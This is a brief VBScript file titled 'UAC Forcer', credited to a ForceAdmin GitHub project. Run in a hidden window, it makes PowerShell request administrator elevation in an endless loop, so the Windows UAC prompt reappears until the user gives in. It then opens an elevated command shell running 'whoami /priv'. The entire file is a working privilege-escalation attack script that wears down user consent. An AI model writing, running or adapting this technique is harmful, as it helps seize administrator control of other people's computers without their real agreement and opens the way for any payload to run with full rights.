' VBScript UAC Forcer 
' Author : https://github.com/Chainski/ForceAdmin
elevate="powershell while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/k whoami /priv';exit}catch{}}"
WScript.CreateObject("WScript.Shell").Run elevate,0,false